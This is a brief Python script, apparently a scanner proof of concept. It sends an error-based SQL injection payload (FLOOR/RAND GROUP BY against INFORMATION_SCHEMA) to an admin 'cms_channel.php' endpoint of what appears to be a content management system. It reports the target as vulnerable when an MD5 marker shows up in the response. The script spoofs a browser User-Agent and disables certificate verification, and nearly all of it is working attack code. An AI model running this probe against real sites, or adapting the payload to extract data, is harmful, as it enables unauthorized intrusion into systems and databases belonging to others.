import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "6f7c6dcbc380aac3bcba1f9fccec991e" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
